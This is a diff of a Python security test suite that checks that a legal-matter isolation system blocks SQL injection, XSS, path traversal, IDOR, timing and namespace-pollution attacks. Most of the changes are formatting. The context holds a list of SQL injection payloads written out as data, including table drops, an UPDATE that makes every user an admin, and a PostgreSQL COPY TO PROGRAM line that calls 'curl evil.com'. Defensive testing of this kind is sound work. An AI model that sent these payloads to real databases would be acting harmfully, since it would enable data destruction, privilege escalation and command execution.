@@ -13,6 +13,7 @@ the 4-layer matter isolation using various attack vectors:
 CRITICAL: All these tests MUST fail (attacks blocked) for security compliance.
 """
 
+import contextlib
 import time
 from unittest.mock import MagicMock, patch
 from uuid import uuid4
@@ -37,6 +38,7 @@ from app.services.rag.namespace import (
 # SQL Injection Attack Tests
 # =============================================================================
 
+
 class TestSQLInjectionAttacks:
     """Test SQL injection attack vectors are blocked."""
 
@@ -49,29 +51,23 @@ class TestSQLInjectionAttacks:
         "1; DROP TABLE users",
         "1 UNION SELECT * FROM users",
         "' UNION SELECT password FROM users --",
-
         # Boolean-based blind injection
         "' AND 1=1 --",
         "' AND 1=2 --",
         "1' AND '1'='1",
-
         # Time-based blind injection
         "'; WAITFOR DELAY '0:0:5' --",
         "'; SELECT SLEEP(5) --",
         "1' AND SLEEP(5) --",
-
         # Stacked queries
         "'; INSERT INTO matters VALUES ('hacked'); --",
         "1; UPDATE users SET role='admin' WHERE 1=1; --",
-
         # Comment-based injection
         "admin'--",
         "1/*comment*/",
-
         # Unicode/encoding attacks
         "%27%20OR%201=1%20--",  # URL encoded
         "\\' OR 1=1 --",  # Escaped quote
-
         # PostgreSQL specific
         "'; COPY (SELECT '') TO PROGRAM 'curl evil.com'; --",
         "1; SELECT pg_sleep(5); --",
@@ -129,6 +125,7 @@ class TestSQLInjectionAttacks:
 # XSS Attack Tests
 # =============================================================================
 
+
 class TestXSSAttacks:
     """Test XSS attack vectors are blocked."""
 
@@ -161,6 +158,7 @@ class TestXSSAttacks:
 # Path Traversal Attack Tests
 # =============================================================================
 
+
 class TestPathTraversalAttacks:
     """Test path traversal attack vectors are blocked."""
 
@@ -185,6 +183,7 @@ class TestPathTraversalAttacks:
 # =============================================================================
 # IDOR Attack Tests (Insecure Direct Object Reference)
 # =============================================================================
+
 
 class TestIDORAttacks:
     """Test IDOR attack prevention."""
@@ -239,6 +238,7 @@ class TestIDORAttacks:
 # Timing Attack Tests
 # =============================================================================
 
+
 class TestTimingAttacks:
     """Test timing attack mitigations."""
 
@@ -262,15 +262,13 @@ class TestTimingAttacks:
         times = []
         for _ in range(5):
             start = time.time()
-            try:
+            with contextlib.suppress(HTTPException):
                 await validator(
                     request=mock_request,
                     matter_id=str(uuid4()),  # Different UUID each time
                     user=mock_user,
                     matter_service=mock_matter_service,
                 )
-            except HTTPException:
-                pass
             elapsed = time.time() - start
             times.append(elapsed)
 
@@ -302,6 +300,7 @@ class TestTimingAttacks:
 # =============================================================================
 # Redis Key Manipulation Tests
 # =============================================================================
+
 
 class TestRedisKeyManipulation:
     """Test Redis key manipulation attack prevention."""
@@ -348,6 +347,7 @@ class TestRedisKeyManipulation:
 # Vector Namespace Pollution Tests
 # =============================================================================
 
+
 class TestVectorNamespacePollution:
     """Test vector namespace pollution attack prevention."""
 
@@ -375,8 +375,18 @@ class TestVectorNamespacePollution:
 
         # Results from matter_b should be filtered when authorized for matter_a
         results = [
-            {"id": "1", "matter_id": matter_a, "content": "A's data", "similarity": 0.9},
-            {"id": "2", "matter_id": matter_b, "content": "B's LEAKED data", "similarity": 0.95},
+            {
+                "id": "1",
+                "matter_id": matter_a,
+                "content": "A's data",
+                "similarity": 0.9,
+            },
+            {
+                "id": "2",
+                "matter_id": matter_b,
+                "content": "B's LEAKED data",
+                "similarity": 0.95,
+            },
         ]
 
         validated = validate_search_results(results, matter_a)
@@ -401,6 +411,7 @@ class TestVectorNamespacePollution:
 # =============================================================================
 # Boundary Condition Tests
 # =============================================================================
+
 
 class TestBoundaryConditions:
     """Test edge cases and boundary conditions."""
@@ -449,6 +460,7 @@ class TestBoundaryConditions:
 # =============================================================================
 # Security Logging Verification
 # =============================================================================
+
 
 class TestSecurityLogging:
     """Test that security events are properly logged."""
